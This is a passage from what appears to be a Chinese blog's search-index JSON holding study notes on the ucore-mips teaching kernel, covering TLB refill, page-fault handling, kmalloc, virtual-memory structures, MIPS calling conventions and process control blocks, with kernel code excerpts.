in kernel, badaddr: 0x%x\\n\", badaddr);\n      tlb_refill(badaddr, pte); \n      return;\n    }else{\n      if(!ptep_u_read(pte)){\n        ret = -1;\n        goto exit;\n      }\n      if(write &amp;&amp; !ptep_u_write(pte)){\n        ret = -2;\n        goto exit;\n      }\n    //kprintf(\"## refill U %d %08x\\n\", write, badaddr);\n      tlb_refill(badaddr, pte);\n      return ;\n    }\n  }\n\nexit:\n  if(ret){\n    print_trapframe(tf);\n    if(in_kernel){\n      panic(\"unhandled pgfault\");\n    }else{\n      do_exit(-E_KILLED);\n    }\n  }\n  return ;\n}\n</code></pre> <ol> <li> <p>\u9996\u5148\u5224\u65ad\u662f\u5426\u5728\u5185\u6838\u4e2d\u53d1\u751f\u4e86\u5f02\u5e38\uff0c\u8fd9\u91cc\u901a\u8fc7Status.KSU\u4f4d\u6765\u5224\u65ad\uff0c2'b00\u8868\u793akernel mode\uff0c2'b10\u8868\u793auser mode\u3002</p> <pre><code>bool\ntrap_in_kernel(struct trapframe *tf) {\n  return !(tf-&gt;tf_status &amp; KSU_USER);\n}\n</code></pre> </li> <li> <p>\u7136\u540e\u83b7\u5f97pte</p> <pre><code>pte_t *pte = get_pte(current_pgdir, tf-&gt;tf_vaddr, 0);\n</code></pre> </li> <li> <p>\u4e4b\u540e\u8fdb\u5165tlb_refill\u51fd\u6570, tlb_refill\u6267\u884ctlbwr\uff0c\u4ecepte\u8bfb\u53d6\u6620\u5c04\u7684\u7269\u7406\u9875\u53f7\u5199\u5165\u5230tlb\u9879\u4e2d\u3002\uff08\u4e00\u6b21\u6620\u5c04\u4e24\u9875\uff09</p> <pre><code>tlb_replace_random(0, badaddr &amp; THUMIPS_TLB_ENTRYH_VPN2_MASK, \n      pte2tlblow(*pte), pte2tlblow(*(pte+1)));\n</code></pre> </li> </ol> <p>\u7ec8\u7aef\u8f93\u51fa</p> <pre><code>## tlb refill in kernel, badaddr: 0x100\ncheck_boot_pgdir() succeeded!\n</code></pre>","tags":["ucore","mips"]},{"location":"%E8%AF%BE%E7%A8%8B/2021/04/06/2021-04-06-ucore-mips-%E4%BB%A3%E7%A0%81%E5%88%86%E6%9E%90/#kmalloc","title":"kmalloc","text":"<p>pmm_init\u4e2d\u8fd8\u8c03\u7528\u4e86kmalloc_init\u3002</p> <p>kmalloc\u4e2d\u4e3b\u8981\u5b9e\u73b0\u4e86\u4ee5\u4e0b\u5173\u952e\u51fd\u6570</p> <pre><code>void *kmalloc(size_t n);\nvoid kfree(void *objp);\n</code></pre> <p>\u53ef\u4ee5\u770b\u5230kmalloc\u51fd\u6570\u7684\u53c2\u6570\u4e3a\u5b57\u8282\u6570\uff0c\u8fd4\u56de\u503c\u4e3a\u5206\u914d\u7684\u7269\u7406\u5185\u5b58\u7684\u865a\u62df\u8d77\u59cb\u5730\u5740\u3002</p> <p>kmalloc\u5229\u7528\u5230\u4e86slab\u673a\u5236</p> <p>slab\u662fLinux\u64cd\u4f5c\u7cfb\u7edf\u7684\u4e00\u79cd\u5185\u5b58\u5206\u914d\u673a\u5236\u3002\u5176\u5de5\u4f5c\u662f\u9488\u5bf9\u4e00\u4e9b\u7ecf\u5e38\u5206\u914d\u5e76\u91ca\u653e\u7684\u5bf9\u8c61\uff0c\u5982\u8fdb\u7a0b\u63cf\u8ff0\u7b26\u7b49\uff0c\u8fd9\u4e9b\u5bf9\u8c61\u7684\u5927\u5c0f\u4e00\u822c\u6bd4\u8f83\u5c0f\uff0c\u5982\u679c\u76f4\u63a5\u91c7\u7528\u4f19\u4f34\u7cfb\u7edf\u6765\u8fdb\u884c\u5206\u914d\u548c\u91ca\u653e\uff0c\u4e0d\u4ec5\u4f1a\u9020\u6210\u5927\u91cf\u7684\u5185\u5b58\u788e\u7247\uff0c\u800c\u4e14\u5904\u7406\u901f\u5ea6\u4e5f\u592a\u6162\u3002\u800cslab\u5206\u914d\u5668\u662f\u57fa\u4e8e\u5bf9\u8c61\u8fdb\u884c\u7ba1\u7406\u7684\uff0c\u76f8\u540c\u7c7b\u578b\u7684\u5bf9\u8c61\u5f52\u4e3a\u4e00\u7c7b(\u5982\u8fdb\u7a0b\u63cf\u8ff0\u7b26\u5c31\u662f\u4e00\u7c7b)\uff0c\u6bcf\u5f53\u8981\u7533\u8bf7\u8fd9\u6837\u4e00\u4e2a\u5bf9\u8c61\uff0cslab\u5206\u914d\u5668\u5c31\u4ece\u4e00\u4e2aslab\u5217\u8868\u4e2d\u5206\u914d\u4e00\u4e2a\u8fd9\u6837\u5927\u5c0f\u7684\u5355\u5143\u51fa\u53bb\uff0c\u800c\u5f53\u8981\u91ca\u653e\u65f6\uff0c\u5c06\u5176\u91cd\u65b0\u4fdd\u5b58\u5728\u8be5\u5217\u8868\u4e2d\uff0c\u800c\u4e0d\u662f\u76f4\u63a5\u8fd4\u56de\u7ed9\u4f19\u4f34\u7cfb\u7edf\uff0c\u4ece\u800c\u907f\u514d\u8fd9\u4e9b\u5185\u788e\u7247\u3002</p>","tags":["ucore","mips"]},{"location":"%E8%AF%BE%E7%A8%8B/2021/04/06/2021-04-06-ucore-mips-%E4%BB%A3%E7%A0%81%E5%88%86%E6%9E%90/#vmm_init","title":"vmm_init","text":"<p>\u901a\u8fc7\u5185\u5b58\u5730\u5740\u865a\u62df\u5316\uff0c\u53ef\u4ee5\u4f7f\u5f97\u8f6f\u4ef6\u5728\u6ca1\u6709\u8bbf\u95ee\u67d0\u865a\u62df\u5185\u5b58\u5730\u5740\u65f6\uf967\u5206\u914d\u5177\u4f53\u7684\u7269\u7406\uf9e4\u5185\u5b58\uff0c\u800c\u53ea\u6709\u5728\u5b9e\u9645\u8bbf\u95ee\u67d0\u865a\u62df\u5185\u5b58\u5730\u5740\u65f6\uff0c\u64cd\u4f5c\u7cfb\u7edf\u518d\u52a8\u6001\u5730\u5206\u914d\u7269\uf9e4\u5185\u5b58\uff0c\u5efa\u7acb\u865a\u62df\u5185\u5b58\u5230\u7269\u7406\uf9e4\u5185\u5b58\u7684\u9875\u6620\u5c04\u5173\u7cfb\uff0c\u8fd9\u79cd\u6280\u672f\u79f0\u4e3a\u6309\u9700\u5206\u9875\uff08demand paging\uff09\u3002\u628a\u4e0d\uf967\u7ecf\u5e38\u8bbf\u95ee\u7684\u6570\u636e\u6240\u5360\u7684\u5185\u5b58\u7a7a\u95f4\u4e34\u65f6\u5199\u5230\u786c\u76d8\u4e0a\uff0c\u8fd9\u6837\u53ef\u4ee5\u817e\u51fa\u66f4\uf901\u591a\u7684\u7a7a\u95f2\u5185\u5b58\u7a7a\u95f4 \u7ed9\u7ecf\u5e38\u8bbf\u95ee\u7684\u6570\u636e\uff1b\u5f53CPU\u8bbf\u95ee\u5230\u4e0d\uf967\u7ecf\u5e38\u8bbf\u95ee\u7684\u6570\u636e\u65f6\uff0c\u518d\u628a\u8fd9\u4e9b\u6570\u636e\u4ece\u786c\u76d8\u8bfb\u5165\u5230\u5185\u5b58\u4e2d\u3002\u8fd9\u79cd\u6280\u672f\u79f0\u4e3a\u9875\u6362\u5165\u6362\u51fa(page in/out)</p>","tags":["ucore","mips"]},{"location":"%E8%AF%BE%E7%A8%8B/2021/04/06/2021-04-06-ucore-mips-%E4%BB%A3%E7%A0%81%E5%88%86%E6%9E%90/#vma_struct","title":"vma_struct","text":"<p>vma\u7528\u4e8e\u63cf\u8ff0\u8fdb\u7a0b\u5bf9\u865a\u62df\u5185\u5b58\u7684\u9700\u6c42</p> <pre><code>struct vma_struct {\n    struct mm_struct *vm_mm; // the set of vma using the same PDT \n    uintptr_t vm_start;      // start addr of vma   \n    uintptr_t vm_end;        // end addr of vma\n    uint32_t vm_flags;       // flags of vma\n    list_entry_t list_link;  // linear list link which sorted by start addr of vma\n};\n</code></pre> <p>vma\u6307\u793a\u4e86\u4e00\u6bb5\u8fde\u7eed\u7684\u865a\u62df\u5185\u5b58\u7a7a\u95f4\uff0c\u4e0d\u540cvma\u901a\u8fc7list_link\u76f8\u8fde\uff0c\u5171\u540c\u8868\u793a\u4e00\u4e2a\u8fdb\u7a0b\u7684\u865a\u62df\u5185\u5b58\u7a7a\u95f4\u3002</p>","tags":["ucore","mips"]},{"location":"%E8%AF%BE%E7%A8%8B/2021/04/06/2021-04-06-ucore-mips-%E4%BB%A3%E7%A0%81%E5%88%86%E6%9E%90/#mm_struct","title":"mm_struct","text":"<pre><code>struct mm_struct {\n    list_entry_t mmap_list;        // linear list link which sorted by start addr of vma\n    struct vma_struct *mmap_cache; // current accessed vma, used for speed purpose\n    pde_t *pgdir;                  // the PDT of these vma\n    int map_count;                 // the count of these vma\n    void *sm_priv;                 // the private data for swap manager\n    atomic_t mm_count;\n    semaphore_t mm_sem;\n    int locked_by;\n};\n</code></pre> <p>mm_struct\u7528\u4e8e\u7ba1\u7406\u4e00\u7cfb\u5217\u4f7f\u7528\u540c\u4e00\u4e2a\u9875\u76ee\u5f55\u8868\u7684vma\u7684\u96c6\u5408\u3002</p> <p>\u8fdb\u7a0b\u63a7\u5236\u5757\u4e2d\u5305\u542b\u4e00\u4e2amm_struct\u7684\u6307\u9488\uff0c\u7528\u4e8e\u7ba1\u7406\u8be5\u8fdb\u7a0b\u7684\u865a\u62df\u5185\u5b58\u7a7a\u95f4</p>","tags":["ucore","mips"]},{"location":"%E8%AF%BE%E7%A8%8B/2021/04/06/2021-04-06-ucore-mips-%E4%BB%A3%E7%A0%81%E5%88%86%E6%9E%90/#\u5173\u952e\u51fd\u6570","title":"\u5173\u952e\u51fd\u6570","text":"<pre><code>struct vma_struct *find_vma(struct mm_struct *mm, uintptr_t addr);\nstruct vma_struct *vma_create(uintptr_t vm_start, uintptr_t vm_end, uint32_t vm_flags);\nvoid insert_vma_struct(struct mm_struct *mm, struct vma_struct *vma);\n</code></pre>","tags":["ucore","mips"]},{"location":"%E8%AF%BE%E7%A8%8B/2021/04/06/2021-04-06-ucore-mips-%E4%BB%A3%E7%A0%81%E5%88%86%E6%9E%90/#check_pgfaultpagefault\u7684\u5904\u7406","title":"check_pgfault\uff08pagefault\u7684\u5904\u7406\uff09","text":"<ol> <li> <p>\u521b\u5efamm_struct</p> <pre><code>check_mm_struct = mm_create();\n</code></pre> <p>\u8fd9\u91cc\u7684<code>check_mm_struct</code>\u4e3a\u5168\u5c40\u53d8\u91cf</p> </li> <li> <p>\u5206\u914d[0, PTSIZE]\u7684\u865a\u62df\u5185\u5b58</p> <pre><code>struct vma_struct *vma = vma_create(0, PTSIZE, VM_WRITE); //\u5982\u679c\u8be5\u6210VM_READ\uff0c\u4e4b\u540e\u5728do_pgfault\u4fbf\u4f1a\u901a\u4e0d\u8fc7\u6743\u9650\u68c0\u67e5\u3002\ninsert_vma_struct(mm, vma);\n</code></pre> </li> <li> <p>\u8bbf\u95ee0x100</p> <pre><code>  uintptr_t addr = 0x100;\n  assert(find_vma(mm, addr) == vma);\n\n  int i, sum = 0;\n  for (i = 0; i &lt; 100; i ++) {\n    *(char *)(addr + i) = i;    //page fault\n    sum += i;\n  }\n  for (i = 0; i &lt; 100; i ++) {\n    sum -= *(char *)(addr + i);\n  }\n  assert(sum == 0);\n</code></pre> </li> <li> <p>\u89e6\u53d1tlb refill\u5f02\u5e38\u3002\uff08\u5b9e\u9645\u4e3apagefault\uff0c\u6b64\u65f6\u9875\u8868\u4e2d\u6ca1\u6709\u8be5\u6620\u5c04\uff0c\u56e0\u6b64tlb\u4e2d\u4e5f\u6ca1\u6709\u8be5\u9879 \uff09</p> <p>\u53c2\u8003\u4e4b\u524dtlb refill\u5f02\u5e38\u5904\u7406\u7684\u4ee3\u7801\uff0c\u8fdb\u5165pgfault_handler</p> <ol> <li>\u9996\u5148\u901a\u8fc7\u5224\u65adcheck_mm_struct\u975e\u7a7a\uff0c\u77e5\u9053\u662f\u5728\u6267\u884ccheck_pgfault\u51fd\u6570\uff0c\u5c06mm\u8bbe\u7f6e\u4e3acheck_mm_struct</li> <li>\u5728do_pgfault\u4e2d\u9996\u5148\u8c03\u7528find_vma\u51fd\u6570\uff0c\u786e\u5b9a\u8be5\u865a\u62df\u5730\u5740\u662f\u6709\u6548\u7684</li> <li>\u7136\u540e\u68c0\u67e5\u8be5\u5730\u5740\u8bbf\u95ee\u6743\u9650\u662f\u5426\u6b63\u786e\uff08\u5982\u679c\u5c06</li> <li>\u90fd\u901a\u8fc7\u4e86\u540e\uff0c\u8c03\u7528pgdir_alloc_page\uff0c\u76f4\u63a5\u5206\u914d\u4e00\u4e2a\u7269\u7406\u9875\uff0c\u5e76\u5728mm-&gt;pgdir\u4e2d\u63d2\u5165\u6620\u5c04\u5173\u7cfb\u3002</li> <li>\u5f02\u5e38\u5904\u7406\u5b8c\u6210\u5e76\u8fd4\u56de</li> </ol> </li> <li> <p>\u518d\u6b21\u89e6\u53d1tlb refill\u5f02\u5e38\u3002\uff08\u73b0\u5728\u9875\u8868\u4e2d\u5b58\u5728\u4e86\u8be5\u6620\u5c04\uff0c\u56e0\u6b64\u8fdb\u5165tlb_refill\u51fd\u6570\uff09</p> </li> </ol> <p>\u7ec8\u7aef\u8f93\u51fa</p> <pre><code>## pagefault in kernel, badaddr: 0x100\n## tlb refill in kernel, badaddr: 0x100\ncheck_pgfault() succeeded!\n</code></pre> <p>\u4ee3\u7801</p> <pre><code>static inline int get_error_code(int write, pte_t *pte)\n{\n  int r = 0;\n  if(pte!=NULL &amp;&amp; ptep_present(pte))    //\u56e0\u4e3apagefault\u7684\u6761\u4ef6(pte==NULL || ptep_invalid(pte))\uff0c\u8fd9\u91cc\u6839\u672c\u4e0d\u53ef\u80fd\u4e3a\u771f\n    r |= 0x01;\n  if(write)\n    r |= 0x02;\n  return r;\n}\n</code></pre> <pre><code>static int\npgfault_handler(struct trapframe *tf, uint32_t addr, uint32_t error_code) {\n  extern struct mm_struct *check_mm_struct;\n  struct mm_struct *mm;\n  if (check_mm_struct != NULL) {\n    assert(current == NULL);\n    mm = check_mm_struct;\n  }\n  else {\n    if (current == NULL) {\n      print_trapframe(tf);\n      //print_pgfault(tf);\n      panic(\"unhandled page fault.\\n\");\n    }\n    mm = current-&gt;mm;\n  }\n  return do_pgfault(mm, error_code, addr);\n}\n</code></pre> <pre><code>#! vmm.c\n\n//page fault number\nvolatile unsigned int pgfault_num=0;\n// do_pgfault - interrupt handler to process the page fault execption\nint\ndo_pgfault(struct mm_struct *mm, uint32_t error_code, uintptr_t addr) {\n  int ret = -E_INVAL;\n  struct vma_struct *vma = find_vma(mm, addr);\n  //kprintf(\"## %08x %08x\\n\", error_code, addr);\n\n  pgfault_num++;\n  if (vma == NULL || vma-&gt;vm_start &gt; addr) {\n    kprintf(\"not valid addr %x, and  can not find it in vma\\n\", addr);\n    goto failed;\n  }\n\n  switch (error_code &amp; 3) {\n    default:\n      /* default is 3: write, present */\n    case 2: /* write, not present */\n      if (!(vma-&gt;vm_flags &amp; VM_WRITE)) {\n        kprintf(\"write, not present in do_pgfault failed\\n\");\n        goto failed;\n      }\n      break;\n    case 1: /* read, present */\n      kprintf(\"read, present in do_pgfault failed\\n\");\n      goto failed;\n    case 0: /* read, not present */\n      if (!(vma-&gt;vm_flags &amp; (VM_READ | VM_EXEC))) {\n        kprintf(\"read, not present in do_pgfault failed\\n\");\n        goto failed;\n      }\n  }\n\n  uint32_t perm = PTE_U;\n  if (vma-&gt;vm_flags &amp; VM_WRITE) {\n    perm |= PTE_W;\n  }\n  addr = ROUNDDOWN_2N(addr, PGSHIFT);\n\n  ret = -E_NO_MEM;\n\n  // try to find a pte, if pte's PT(Page Table) isn't existed, then create a PT.\n  pte_t *ptep=NULL;\n  if ((ptep = get_pte(mm-&gt;pgdir, addr, 1)) == NULL) {\n    goto failed;\n  }\n\n  if (*ptep == 0) { // if the phy addr isn't exist, then alloc a page &amp; map the phy addr with logical addr\n    if (pgdir_alloc_page(mm-&gt;pgdir, addr, perm) == NULL) {\n      goto failed;\n    }\n  }\n  else { // if this pte is a swap entry, then load data from disk to a page with phy addr, \n    // map the phy addr with logical addr, trig swap manager to record the access situation of this page\n    if(swap_init_ok) {\n      panic(\"No swap!! never reach!!\"); \n    }\n    else {\n      kprintf(\"no swap_init_ok but ptep is %x, failed\\n\",*ptep);\n      goto failed;\n    }\n  }\n  /* refill TLB for mips, no second exception */\n  //tlb_refill(addr, ptep);\n  ret = 0;\nfailed:\n  return ret;\n}\n</code></pre>","tags":["ucore","mips"]},{"location":"%E8%AF%BE%E7%A8%8B/2021/04/06/2021-04-06-ucore-mips-%E4%BB%A3%E7%A0%81%E5%88%86%E6%9E%90/#\u51fd\u6570\u8c03\u7528","title":"\u51fd\u6570\u8c03\u7528","text":"<ol> <li> <p>\u4f7f\u7528jal\u8c03\u7528\u51fd\u6570\uff0c\u4f7f\u7528jr ra\u8fd4\u56de\u3002\u4f7f\u7528a0-a3\u4f20\u9012\u53c2\u6570\uff0c\u4f7f\u7528v0-v1\u4f20\u9012\u8fd4\u56de\u503c\u3002\u5bf9\u4e8e\u66f4\u591a\u7684\u53c2\u6570\uff0c\u4f7f\u7528\u6808\u4f20\u9012\u3002</p> </li> <li> <p>\u4e3a\u4e86\u9632\u6b62\u5bc4\u5b58\u5668\u7684\u503c\u88ab\u8986\u76d6\u3002\u9700\u8981\u5728\u5b58\u50a8\u5bc4\u5b58\u5668\u7684\u503c\uff0c\u53ef\u4ee5\u7531caller\u6216\u8005callee\u6765\u5b8c\u6210\u3002\u4f46\u662f\u53ea\u6709\u4e00\u65b9\u5b8c\u6210\u65f6\uff0c\u56e0\u4e3acaller\u4e0d\u77e5\u9053callee\u4f1a\u7528\u54ea\u4e9b\u5bc4\u5b58\u5668\uff0c\u6216\u8005callee\u4e0d\u77e5\u9053caller\u9700\u8981\u7528\u54ea\u4e9b\u5bc4\u5b58\u5668\u3002\u56e0\u6b64\u5c31\u4f1a\u5bfc\u81f4\u5b58\u50a8\u4e0d\u5fc5\u8981\u7684\u5bc4\u5b58\u5668\u3002MIPS\u91c7\u7528\u4e86\u4e00\u79cd\u6298\u8877\u7684\u7b56\u7565\uff0c\u5c06\u5bc4\u5b58\u5668\u5206\u4e3acaller-save\uff08\u5982t0-t7, a0-a3, v0-v1\uff09\u548ccallee-save\uff08\u5982s0-s7, ra\uff09</p> </li> <li> <p>fp\u5bc4\u5b58\u5668\uff08\u4e5f\u662fs8\uff09\u7528\u4e8e\u6307\u5411\u6808\u5e27\u7684\u7b2c\u4e00\u4e2a\u5143\u7d20\u3002\u56e0\u4e3ax86\u4e2d\u63d0\u4f9b\u4e86push\u548cpop\u6307\u4ee4\uff0csp\u7684\u4f4d\u7f6e\u662f\u53d8\u5316\u7684\uff0c\u8981\u5f15\u7528\u4e0d\u540c\u53d8\u91cf\u7684\u503c\u662f\u7528fp\u66f4\u65b9\u4fbf\u3002\u800cMIPS\u4e2d\u5219\u662f\u5728\u51fd\u6570\u7684\u5f00\u5934\u624b\u52a8\u5c06sp\u8bbe\u7f6e\uff0csp\u4e4b\u540e\u7684\u503c\u4e0d\u4f1a\u53d8\u5316\uff0c\u56e0\u6b64fp\u8c8c\u4f3c\u4f5c\u7528\u4e0d\u5927\u3002</p> </li> <li> <p>gp\u5bc4\u5b58\u5668\uff0c\u7528\u4e8e\u7a0b\u5e8f\u8bbf\u95ee\u5168\u5c40\u53d8\u91cf\uff08\u6bd4\u5982\u51fd\u6570\u7684\u5730\u5740\uff09\u3002</p> </li> </ol> <p>ps. \u4f7f\u7528mipsel-linux-gnu-gcc -S\u7f16\u8bd1\u4e00\u4e2a\u7b80\u5355\u7684\u51fd\u6570\u8c03\u7528\u6d4b\u8bd5\u4ee3\u7801\u3002\u4e0d\u77e5\u4e3a\u4ec0\u4e48\u548c\u4e0a\u9762\u8bb2\u7684caller-save\uff0ccallee-save\u5bf9\u4e0d\u4e0a\u3002\u6bd4\u5982\u51fd\u6570\u5f00\u5934<code>addiu $sp,$sp,-40</code>\uff0c\u4f46\u7ed3\u679c\u5374\u6839\u672c\u6ca1\u7528\u4e0a\u8fd9\u4e48\u5927\u7684\u7a7a\u95f4\u3002\u7136\u540e\uff0c\u4e3a\u4ec0\u4e48\u8fd8\u4f1a\u51fa\u73b0<code>sw $a0,40($fp)</code>\uff0c\u5373\u5c06\u53c2\u6570<code>a0</code>\u5199\u5165\u7236\u51fd\u6570\u6808\u5e27\u7684\u60c5\u51b5\u3002\uff08\u8fd9\u4e2a\u7136\u540efp\u548csp\u59cb\u7ec8\u76f8\u7b49\uff0c\u4e0d\u77e5\u9053\u4e3a\u4ec0\u4e48\u8981\u53bb\u5b58\u50a8fp</p>","tags":["ucore","mips"]},{"location":"%E8%AF%BE%E7%A8%8B/2021/04/06/2021-04-06-ucore-mips-%E4%BB%A3%E7%A0%81%E5%88%86%E6%9E%90/#sched_init--proc_init","title":"sched_init &amp; proc_init","text":"","tags":["ucore","mips"]},{"location":"%E8%AF%BE%E7%A8%8B/2021/04/06/2021-04-06-ucore-mips-%E4%BB%A3%E7%A0%81%E5%88%86%E6%9E%90/#proc_struct\u8fdb\u7a0b\u63a7\u5236\u5757","title":"proc_struct(\u8fdb\u7a0b\u63a7\u5236\u5757)","text":"<pre><code>struct proc_struct {\n    enum proc_state state;                      // Process state\n    int pid;                                    // Process ID\n    int runs;                                   // the running times of Proces\n    uintptr_t kstack;                           // Process kernel stack\n    volatile bool need_resched;                 // bool value: need to be rescheduled to release CPU?\n    struct proc_struct *parent;                 // the parent process\n    struct mm_struct *mm;                       // Process's memory management field\n    struct context context;                     // Switch here to run process\n    struct trapframe *tf;                       // Trap frame for current interrupt\n    uintptr_t cr3;                              // CR3 register: the base addr of Page Directroy Table(PDT)\n    uint32_t flags;                             // Process flag\n    char name[PROC_NAME_LEN + 1];               // Process name\n    list_entry_t list_link;                     // Process link list \n    list_entry_t hash_link;                     // Process hash list\n    int exit_code;                              // exit code (be sent to parent proc)\n    uint32_t wait_state;                        // waiting state\n    struct proc_struct *cptr, *yptr, *optr;     // relations between processes\n    struct run_queue *rq;                       // running queue contains Process\n    list_entry_t run_link;                      // the entry linked in run queue\n    int time_slice;                             // time slice for occupying the CPU\n    struct fs_struct *fs_struct;                // the file related info(pwd, files_count, files_array, fs_semaphore) of process\n};\n</code></pre>","tags":["ucore","mips"]},{"location":"%E8%AF%BE%E7%A8%8B/2021/04/06/2021-04-06-ucore-mips-%E4%BB%A3%E7%A0%81%E5%88%86%E6%9E%90/#tf","title":"tf","text":"<pre><code>struct trapframe {\n    uint32_t tf_vaddr;  /* coprocessor 0 vaddr register */\n    uint32_t tf_status; /* coprocessor 0 status register */\n    uint32_t tf_cause;  /* coprocessor 0 cause register */\n    uint32_t tf_lo;\n    uint32_t tf_hi;\n    uint32_t tf_ra; /* Saved register 31 */\n  struct pushregs tf_regs;\n    uint32_t tf_epc;    /* coprocessor 0 epc register */\n};\n</code></pre> <p>tf\u8bb0\u5f55\u4e86</p> <ol> <li>\u8fdb\u7a0b\u7684\u4e0a\u4e0b\u6587\uff1a32\u4e2a\u901a\u7528\u5bc4\u5b58\u5668\u7684\u503c</li> <li>epc, status, cause\u7b49CP0\u5bc4\u5b58\u5668</li> </ol> <p>\u8fdb\u5165\u5f02\u5e38\u540e\uff0c\u8981\u5c06sp\u5207\u6362\u5230\u5185\u6838\u6808\u3002\u5bf9\u4e8e\u5185\u6838\u8fdb\u7a0b\u6765\u8bf4\uff0c\u5c31\u662f\u5f53\u524d\u7684sp\uff0c\u800c\u5bf9\u4e8e\u7528\u6237\u8fdb\u7a0b\u6765\u8bf4\uff0c\u9700\u8981\u4ece\u8fdb\u7a0b\u63a7\u5236\u5757\u4e2d\u8bfb\u53d6kstack\u7684\u5730\u5740\u3002</p> <p>uCore\u5185\u6838\u5141\u8bb8\u5d4c\u5957\u4e2d\u65ad\u3002\u56e0\u6b64\u4e3a\u4e86\uf9ba\u4fdd\u8bc1\u5d4c\u5957\u4e2d\u65ad\u53d1\u2f63\u751f\u65f6tf \u603b\u662f\u80fd\u591f\u6307\u5411\u5f53\u524d\u7684trapframe\uff0cuCore \u5728\u5185\u6838\u6808\u4e0a\u7ef4\u62a4\u4e86\uf9ba tf \u7684\u94fe\u3002</p> <p>\u53d1\u751f\u4e2d\u65ad\uff08\u5f02\u5e38\uff09\u65f6\uff0ctrap.c::mips_trap\u4f1a\u6539\u53d8\u5f53\u524d\u8fdb\u7a0bcurrent-&gt;tf\u7684\u503c</p> <p><code>current-&gt;tf = *tf*;</code></p> <p>\u8981\u5b9e\u73b0\u5d4c\u5957\u4e2d\u65ad\uff0c\u9700\u8981\u5728\u6539\u53d8current-&gt;tf\u524d\u4f7f\u7528\u4e00\u4e2atrapframe *otf\uff08\u5c40\u90e8\u53d8\u91cf\uff0c\u5b58\u50a8\u5728\u5185\u6838\u6808\u4e2d\uff09\u5b58\u4e0b\u6765\u3002\u4e4b\u540e\u518d\u5c06current-&gt;tf\u6062\u590d\u4e3aotf\u3002</p> <p>\u8fd9\u91cc\u63d0\u4e00\u4e0b\uff0c\u5982\u679c\u4e00\u4e2a\u7528\u6237\u8fdb\u7a0b\u53d1\u751f\u4e86\u5f02\u5e38\uff0c\u5728\u5f02\u5e38\u5904\u7406\u7a0b\u5e8f\u4e2d\u53c8\u53d1\u751f\u4e86\u4e00\u6b21\u5f02\u5e38\uff0c\u90a3\u4e48\u7b2c\u4e8c\u6b21\u5f02\u5e38\u65f6\uff0c\u5df2\u7ecf\u5904\u4e8e\u4e86\u5185\u6838\u6a21\u5f0f\uff08\u5728\u538b\u5165tf\u540e\uff0c\u8c03\u7528mips_trap\u4e4b\u524d\uff09\u3002\u5728ramExcHandle_general\u4e2d\u5c31\u4e0d\u4f1a\u8ba1\u7b97\u65b0\u7684sp</p> <pre><code>mfc0 k0, CP0_STATUS /* Get status register */\nandi k0, k0, KSU_USER/* Check the we-were-in-user-mode bit */\nbeq   k0, $0, 1f      /* If clear, from kernel, already have stack */\n</code></pre>","tags":["ucore","mips"]},{"location":"%E8%AF%BE%E7%A8%8B/2021/04/06/2021-04-06-ucore-mips-%E4%BB%A3%E7%A0%81%E5%88%86%E6%9E%90/#kstack","title":"kstack","text":"<p>\u5185\u6838\u6808\u7528\u4e8e\u5b58\u50a8\u4e2d\u65ad\u5e27tf\u4ee5\u53ca\u4f5c\u4e3a\u8fdb\u7a0b\u5728\u5185\u6838\u4e2d\u6267\u884c\u4f7f\u7528\u7684sp</p> <p>\u5bf9\u4e8e\u5185\u6838\u7ebf\u7a0b\uff0c\u8be5\u6808\u5c31\u662f\u8fd0\ufa08\u65f6\u7684\u7a0b\u5e8f\u4f7f\u2f64\u7528\u7684\u6808\u3002\u800c\u5bf9\u4e8e\u666e\u901a\u8fdb\u7a0b\uff0cuCore\u5728\u521b\u5efa\u8fdb\u7a0b\u65f6\u5206\u914d\u4e86\uf9ba 2 \u4e2a\u8fde\u7eed\u7684\u7269\u7406\uf9e4\u2eda\u9875\u4f5c\u4e3a\u5185\u6838\u6808\u7684\u7a7a\u95f4\u3002</p> <p>\u5185\u6838\u6808\u4f4d\u4e8e\u5185\u6838\u5730\u5740\u7a7a\u95f4\uff0c\u5e76\u4e14\u662f\u4e0d\uf967\u5171\u4eab\u7684\uff08\u6bcf\u4e2a\u7ebf\u7a0b\u90fd\u62e5\u6709\u2f83\u81ea\u2f30\u5df1\u7684\u5185\u6838\u6808\uff09\uff0c\u56e0\u6b64\u4e0d\uf967\u53d7\u5230 mm \u7684\u7ba1\u7406\uf9e4\uff0c\u5f53\u8fdb\u7a0b\u9000\u51fa\u7684\u65f6\u5019\uff0c\u5185\u6838\u80fd\u591f\u6839\u636e kstack \u7684\u503c\u5feb\u901f\u5b9a\u4f4d\u6808\u7684\u4f4d\u7f6e\u5e76\u8fdb\u2f8f\u884c\ufa08\u56de\u6536\u3002</p>","tags":["ucore","mips"]},{"location":"%E8%AF%BE%E7%A8%8B/2021/04/06/2021-04-06-ucore-mips-%E4%BB%A3%E7%A0%81%E5%88%86%E6%9E%90/#mm","title":"mm","text":"<p>\u5185\u5b58\u7ba1\u7406\uf9e4\u7684\u4fe1\u606f\uff0c\u5305\u62ec\u5185\u5b58\u6620\u5c04\u5217\uf99c\u8868\u3001\u2eda\u9875\u8868\u6307\u9488\u7b49\u3002mm\u6210\u5458\u53d8\u91cf\uf97e\u5728lab3\u4e2d\u2f64\u7528\u4e8e\u865a\u5b58\u7ba1\u7406\uf9e4\u3002\u4f46\u5728\u5b9e\u9645OS\u4e2d\uff0c\u5185\u6838\u7ebf\u7a0b\u5e38\u9a7b\u5185\u5b58\uff0c\u4e0d\uf967\u9700\u8981\u8003\u8651swap page\u95ee\u9898\uff0c\u5728lab3\u4e2d\u6d89\u53ca\u5230\u4e86\uf9ba\u2f64\u7528\u6237\u8fdb\u7a0b\uff0c\u624d\u8003\u8651\u8fdb\u7a0b\u2f64\u7528\u6237\u5185\u5b58\u7a7a\u95f4\u7684swap page\u95ee\u9898\uff0cmm\u624d\u4f1a\u53d1\u6325\u4f5c\u2f64\u7528\u3002</p> <p>\u8fd8\u6ca1\u770b\u5230\u7528\u6237\u8fdb\u7a0b\u7684swap 